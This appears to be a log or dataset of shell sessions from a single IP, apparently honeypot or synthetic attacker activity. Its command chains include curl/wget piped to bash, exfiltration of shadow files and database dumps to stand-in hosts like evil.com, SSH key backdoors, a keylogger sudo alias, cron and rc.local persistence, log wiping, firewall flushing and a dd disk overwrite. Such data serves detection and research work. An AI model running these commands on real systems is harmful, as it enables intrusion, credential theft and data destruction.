+70d20751316b,2026-04-20T20:16:36.265680Z,88.13.24.103,dd if=/dev/zero of=/dev/sda bs=1M count=10 -> exit,2
+e1591fb07a66,2026-04-20T20:17:32.826386Z,88.13.24.103,curl -sL http://pastebin.com/raw/xyz123 | bash -> w -> exit,3
+ecb4b173f095,2026-04-20T20:18:22.219925Z,88.13.24.103,echo c > /proc/sysrq-trigger -> exit,2
+ee8925dc6aae,2026-04-20T20:18:28.092459Z,88.13.24.103,getcap -r / 2>/dev/null -> clear -> exit,3
+2a9dabfde999,2026-04-20T20:19:15.757121Z,88.13.24.103,ls -l /etc/shadow -> chmod 777 /etc/shadow -> exit,3
+70f43c0525b0,2026-04-20T20:20:11.783164Z,88.13.24.103,echo  'ssh-rsa  AAAAB3NzaC1...  hacker@evil'  >>  ~/.ssh/authorized_keys -> chmod 600 ~/.ssh/authorized_keys -> exit,3
+c07111fb2c33,2026-04-20T20:20:37.426414Z,88.13.24.103,echo c > /proc/sysrq-trigger -> exit,2
+c4d6cad926b2,2026-04-20T20:21:51.553113Z,88.13.24.103,who -> uname  -a -> whoami ->  -> id -> cat /proc/cpuinfo -> echo '' -> cat /etc/os-release -> free  -m -> df -h -> exit,11
+0ffe8e9db23e,2026-04-20T20:23:08.592515Z,88.13.24.103,find /home -type f -name '*.txt' -> date -> echo 'Tus archivos han sido encriptados. Paga 1 BTC a esta direccion.' > /home/LEER_ESTO.txt -> exit,4
+0580142ad324,2026-04-20T20:23:49.074905Z,88.13.24.103,ll -> cat /etc/hostname -> cat /etc/hosts -> cat /etc/resolv.conf -> date -> exit,6
+b8f241805172,2026-04-20T20:24:28.390639Z,88.13.24.103,cd /etc -> ll -> tar -czvf config_backup.tar.gz passwd shadow ssh/ -> curl  -F  'data=@config_backup.tar.gz'  http://attacker-server.com/upload ->  -> rm config_backup.tar.gz -> exit,7
+fe69a4b50f86,2026-04-20T20:24:51.981656Z,88.13.24.103,cd .. -> useradd -m -s /bin/bash sysadmin,2
+d43c179a9a27,2026-04-20T20:26:03.541605Z,88.13.24.103,sudo -l -> find / -perm -4000 -type f 2>/dev/null -> cat /etc/sudoers -> exit,4
+675de0f28537,2026-04-20T20:27:55.972457Z,88.13.24.103,"cd /tmp -> echo 'alias sudo=""sudo /tmp/keylogger.sh""' >> ~/.bashrc -> clear -> source ~/.bashrc -> exit",5
+e4212dd25cf2,2026-04-20T20:28:37.271619Z,88.13.24.103,echo 'ssh-rsa AAAAB3NzaC1... hacker@evil' >> ~/.ssh/authorized_keys -> chmod 600 ~/.ssh/authorized_keys -> echo '' -> exit,4
+e4baa4cef506,2026-04-20T20:29:02.539169Z,88.13.24.103,systemctl  enable  botnet.service -> cd .. -> systemctl  start  botnet -> exot,4
+f512efc5e864,2026-04-20T20:33:54.757147Z,88.13.24.103,"echo 'alias sudo=""sudo /tmp/keylogger.sh""' >> ~/.bashrc -> source ~/.bashrc -> exit",3
+1c7af0410b64,2026-04-20T20:34:07.158440Z,88.13.24.103,ps aux -> kill  -9  1234 -> rm -rf /var/log/* -> pwd -> cat /dev/null > ~/.bash_history -> cd /tmp -> history  -c -> cd - -> exit,9
+df82d98000db,2026-04-20T20:34:28.611568Z,88.13.24.103,"echo 'alias sudo=""sudo /tmp/keylogger.sh""' >> ~/.bashrc -> source ~/.bashrc -> exit",3
+b7d56391c2c6,2026-04-20T20:37:48.723969Z,88.13.24.103,w -> wget -q -O - http://185.112.x.x/installer.sh | bash ->  -> exit,4
+51873338b9a0,2026-04-20T20:38:28.520352Z,88.13.24.103,ls -l /etc/shadow -> chmod 777 /etc/shadow -> exit,3
+9c28a5f31ca2,2026-04-20T20:39:52.629082Z,88.13.24.103,redis-cli ping -> ls -la -> redis-cli config get dir -> exit,4
+a2303c948e84,2026-04-20T20:41:15.472730Z,88.13.24.103,iptables -F -> clear -> iptables -X -> iptables -P INPUT ACCEPT -> cd - -> iptables  -P  OUTPUT  ACCEPT -> cd - -> exit,8
+48581851a0a3,2026-04-20T20:42:07.789093Z,88.13.24.103,redis-cli ping -> redis-cli config get dir -> exit,3
+716c110e3828,2026-04-20T20:44:39.529990Z,88.13.24.103,uname  -r -> who -> gcc  exploit.c  -o  exploit ->  -> cd /tmp -> ./exploit -> ls -> whoami -> exit,9
+3f987cadfdc3,2026-04-20T20:44:57.136661Z,88.13.24.103,cat /etc/hostname -> cat /etc/hosts ->  -> cat /etc/resolv.conf -> exit,5
+bcb2b9d83ba3,2026-04-20T20:45:32.237038Z,88.13.24.103,useradd  -m  -s  /bin/bash  sysadmin,1
+ad355ba78128,2026-04-20T20:45:45.222611Z,88.13.24.103,cd ~ -> ls -l /etc/shadow ->  -> chmod 777 /etc/shadow -> w -> exit,6
+80451b99a088,2026-04-20T20:45:55.296854Z,88.13.24.103,enable -> system -> shell -> sh -> cat /proc/mounts -> exit,6
+e94ef036d6fe,2026-04-20T20:46:11.566572Z,88.13.24.103,cat /var/log/auth.log | grep Failed -> cat  /var/log/syslog ->  -> exot -> ,5
+fece63369487,2026-04-20T20:48:52.242539Z,88.13.24.103,mysqldump -u root -p123456 db_name > dump.sql -> ls -la -> scp  dump.sql  hacker@evil.com:/tmp/,3
+a2954507ce9e,2026-04-20T20:52:07.978262Z,88.13.24.103,echo 'ssh-rsa AAAAB3NzaC1... hacker@evil' >> ~/.ssh/authorized_keys -> chmod 600 ~/.ssh/authorized_keys -> exot -> exit,4
+ac6c14ad64f6,2026-04-20T20:54:21.576218Z,88.13.24.103,history -> echo 'ssh-rsa AAAAB3NzaC1... hacker@evil' >> ~/.ssh/authorized_keys -> ll -> chmod 600 ~/.ssh/authorized_keys -> exit,5
+59d7548d2480,2026-04-20T20:55:58.535150Z,88.13.24.103,enable ->  -> date -> system -> date -> shell -> sh -> ls -lah -> cat  /proc/mounts -> exit,10
+4cce14383a8f,2026-04-20T21:00:17.352355Z,88.13.24.103,cd .. -> cd /dev/shm -> tftp  -g  -r  mips.bot  192.168.1.100 ->  -> cd - -> chmod 777 mips.bot -> ./mips.bot -> rm mips.bot,8
+801a44986a7c,2026-04-20T21:00:37.902403Z,88.13.24.103,ps aux -> cd /tmp -> netstat -tulnp -> cat /etc/issue -> ifconfig -> ip  a -> route -n -> arp -a -> exit,9
+910cf2e613ec,2026-04-20T21:03:34.728385Z,88.13.24.103,cd /dev/shm -> tftp -g -r mips.bot 192.168.1.100 -> chmod  777  mips.bot ->  -> ./mips.bot -> rm  mips.bot -> exit,7
+07b3ba3868c6,2026-04-20T21:04:26.806209Z,88.13.24.103,iptables -F -> iptables -X -> iptables -P INPUT ACCEPT -> iptables -P OUTPUT ACCEPT -> exit,5
+bd2929bb3299,2026-04-20T21:05:54.134666Z,88.13.24.103,cd - -> mysqldump -u root -p123456 db_name > dump.sql -> scp dump.sql hacker@evil.com:/tmp/,3
+f41cf7a63234,2026-04-20T21:07:14.693869Z,88.13.24.103,cat /etc/hostname -> cat /etc/issue -> cat /etc/hosts -> cat /etc/resolv.conf -> exit,5
+74b2631feaa5,2026-04-20T21:07:47.701967Z,88.13.24.103,env -> set -> uptime -> echo $PATH -> history -> cat ~/.bash_history -> exit,7
+10f13c92d687,2026-04-20T21:09:50.940344Z,88.13.24.103,date -> redis-cli  ping ->  -> uptime -> redis-cli  config  get  dir -> exit,6
+d20dde5f832c,2026-04-20T21:11:39.483803Z,88.13.24.103,enable -> system -> ls -la -> shell -> w -> sh -> ll -> cat /proc/mounts -> exit,9
+ad02e3f4fb6e,2026-04-20T21:11:59.142000Z,88.13.24.103,find  /home  -type  f  -name  '*.txt' ->  -> echo  'Tus  archivos  han  sido  encriptados.  Paga  1  BTC  a  esta  direccion.'  >  /home/LEER_ESTO.txt -> exit,4
+dcf7bb1ee0d0,2026-04-20T21:15:20.063112Z,88.13.24.103,w -> echo '0 * * * * root /tmp/.bot.sh' >> /etc/crontab -> crontab  -l -> exit,4
+250e07fca0d8,2026-04-20T21:15:52.364250Z,88.13.24.103,uptime -> cat  /var/www/html/wp-config.php -> grep -i 'password' /var/www/html/wp-config.php -> cat /etc/issue -> exit,5
+e1f4dc2424af,2026-04-20T21:18:40.495373Z,88.13.24.103,cd .. -> ls -la /home -> cat  /etc/paswd -> cat /etc/shadow -> cat  /etc/group -> exot -> exit,7
+a225010b0813,2026-04-20T21:21:49.977353Z,88.13.24.103,ls -l /etc/shadow -> cd /tmp -> chmod 777 /etc/shadow -> exit,4
+53ff1f275055,2026-04-20T21:22:26.780577Z,88.13.24.103,cd /tmp -> wget http://malware-domain.com/xmrig.tar.gz -> pwd -> tar  -zxvf  xmrig.tar.gz -> ll -> chmod +x xmrig -> ./xmrig -o pool.com:3333 -u hacker -> cat /etc/issue -> rm  -rf  xmrig* -> exit,10
+d081e197c914,2026-04-20T21:24:22.057457Z,88.13.24.103,find / -name '*.pem' -o -name '*.key' -o -name '*.ovpn' 2>/dev/null -> cat /home/user/aws.pem ->  -> exot,4
+8a2a369c117d,2026-04-20T21:25:02.318666Z,88.13.24.103,"clear -> nmap -sT -p 22,80,443,3306 192.168.1.0/24 -> exit",3
+7853e205883f,2026-04-20T21:27:12.166860Z,88.13.24.103,env -> set -> echo $PATH -> history -> cd .. -> cat ~/.bash_history -> pwd -> exit,8
+e3b8a7ecfaa5,2026-04-20T21:27:39.653503Z,88.13.24.103,"nmap  -sT  -p  22,80,443,3306  192.168.1.0/24 -> exit",2
+8ed736278f41,2026-04-20T21:28:11.369737Z,88.13.24.103,zip  -r  data.zip  /var/lib/mysql -> wget  --post-file=data.zip  http://exfil-server.com/receive -> uptime -> rm data.zip ->  -> exit,6
+840e93bddaae,2026-04-20T21:29:21.967061Z,88.13.24.103,w -> echo c > /proc/sysrq-trigger -> exit,3
+cddd90315352,2026-04-20T21:29:35.835136Z,88.13.24.103,cd /tmp -> cat /var/log/auth.log | grep Failed -> cat /var/log/syslog -> exit,4
+a5b096ccf641,2026-04-20T21:30:13.341269Z,88.13.24.103,w -> redis-cli ping -> echo '' -> redis-cli config get dir -> ls -lah -> exit,6
+af43f4333654,2026-04-20T21:30:52.898581Z,88.13.24.103,sudo  -l -> find / -perm -4000 -type f 2>/dev/null -> cat /etc/sudoers -> exit,4
+55823ea1b23f,2026-04-20T21:31:04.466982Z,88.13.24.103,systemctl enable botnet.service -> echo '' -> systemctl start botnet -> exit,4
+e2257e0a1525,2026-04-20T21:32:19.046289Z,88.13.24.103,find / -name '*.pem' -o -name '*.key' -o -name '*.ovpn' 2>/dev/null -> cat /home/user/aws.pem -> date -> exit,4
+5845bd4a5e6a,2026-04-20T21:35:45.383467Z,88.13.24.103,iptables -F -> uptime -> iptables  -X -> iptables -P INPUT ACCEPT -> iptables -P OUTPUT ACCEPT -> exit,6
+222393496159,2026-04-20T21:36:23.867005Z,88.13.24.103,echo '0 * * * * root /tmp/.bot.sh' >> /etc/crontab -> crontab -l -> exit,3
+70554a1bfe46,2026-04-20T21:37:19.434086Z,88.13.24.103,uname -r -> gcc exploit.c -o exploit -> ./exploit -> whoami -> w -> exit,6
+153c9f12aef2,2026-04-20T21:40:34.472166Z,88.13.24.103,cd /tmp -> uname  -r -> gcc exploit.c -o exploit -> ./exploit ->  -> whoami -> exit,7
+e6452553a3b6,2026-04-20T21:41:15.130512Z,88.13.24.103,wget  -q  -O  -  http://185.112.x.x/installer.sh  |  bash -> exot,2
+8456e7fb40f5,2026-04-20T21:42:26.623896Z,88.13.24.103,sudo -l -> w -> find  /  -perm  -4000  -type  f  2>/dev/null -> cat /etc/sudoers -> exit,5
+f5ec69b6b476,2026-04-20T21:42:40.375602Z,88.13.24.103,find /var/www/ -name '*.env' -> cat /var/www/html/.env -> uptime -> exit,4
+ca802cb559d2,2026-04-20T21:47:56.877638Z,88.13.24.103,cd /tmp ->  -> date -> wget  http://malware-domain.com/xmrig.tar.gz ->  -> ll -> tar -zxvf xmrig.tar.gz ->  -> chmod  +x  xmrig -> ./xmrig  -o  pool.com:3333  -u  hacker -> cd - -> rm -rf xmrig* -> exit,13
+a0f47d4fd1e2,2026-04-20T21:50:18.259817Z,88.13.24.103,cd /dev/shm -> cd /tmp -> tftp  -g  -r  mips.bot  192.168.1.100 -> chmod 777 mips.bot -> ./mips.bot -> cd .. -> rm mips.bot -> exit,8
+ee43bc5cb570,2026-04-20T21:51:24.649220Z,88.13.24.103,pwd -> wget -q -O - http://185.112.x.x/installer.sh | bash -> exit,3
+34dfbc533c5d,2026-04-20T21:52:01.484396Z,88.13.24.103,iptables  -F -> clear -> iptables -X -> iptables -P INPUT ACCEPT -> iptables  -P  OUTPUT  ACCEPT ->  -> exit,7
+39d2ea55f2e2,2026-04-20T21:53:28.160333Z,88.13.24.103,ls -la -> uname  -a -> whoami -> id -> cat /proc/cpuinfo -> cat /etc/os-release -> pwd -> free -m -> ll -> df -h ->  -> exit,12
+a2e50a25d89c,2026-04-20T21:55:49.225001Z,88.13.24.103,iptables -F -> iptables  -X -> iptables -P INPUT ACCEPT -> who -> iptables -P OUTPUT ACCEPT -> exit,6
+a4c1caac3ec9,2026-04-20T21:58:30.680457Z,88.13.24.103,echo 'ssh-rsa AAAAB3NzaC1... hacker@evil' >> ~/.ssh/authorized_keys -> ls -la -> chmod 600 ~/.ssh/authorized_keys -> exit,4
+2d96e0eb26f6,2026-04-20T21:58:50.723608Z,88.13.24.103,psql -U postgres -c '\l' -> who -> exit,3
+93518fb721d2,2026-04-20T21:58:59.486137Z,88.13.24.103,mongo --eval 'db.adminCommand( { listDatabases: 1 } )' -> exit,2
+e97a08816676,2026-04-20T21:59:06.127356Z,88.13.24.103,systemctl enable botnet.service -> systemctl start botnet -> exit,3
+981e066a6951,2026-04-20T22:00:19.944664Z,88.13.24.103,redis-cli ping -> redis-cli config get dir -> exit,3
+a0337cfe9ae8,2026-04-20T22:01:47.743236Z,88.13.24.103,cat /etc/rc.local -> echo '/tmp/miner &' >> /etc/rc.local -> exit,3
+39365d184572,2026-04-20T22:02:31.793610Z,88.13.24.103,date -> wget -q -O - http://185.112.x.x/installer.sh | bash -> ls -> exit -> ,5
+5514fe7b4258,2026-04-20T22:04:50.339385Z,88.13.24.103,ll -> dd if=/dev/zero of=/dev/sda bs=1M count=10 -> exit,3
+ea1cc1e86e63,2026-04-20T22:06:12.975441Z,88.13.24.103,uptime -> cd /var/tmp -> curl -O http://botnet-c2.net/payload.sh -> bash  payload.sh -> uptime -> rm payload.sh -> exit,7
+3b02da0039f8,2026-04-20T22:07:08.398384Z,88.13.24.103,cat /etc/rc.local ->  -> echo '/tmp/miner &' >> /etc/rc.local -> exit,4
+1f300d3dea50,2026-04-20T22:09:24.763057Z,88.13.24.103,mysqldump -u root -p123456 db_name > dump.sql -> pwd -> scp  dump.sql  hacker@evil.com:/tmp/,3
+328fb097b866,2026-04-20T22:11:22.755136Z,88.13.24.103,mongo --eval 'db.adminCommand( { listDatabases: 1 } )' ->  -> exit,3
+2aa06d386126,2026-04-20T22:11:49.708452Z,88.13.24.103,cat /etc/rc.local -> echo '/tmp/miner &' >> /etc/rc.local -> ll -> exit,4
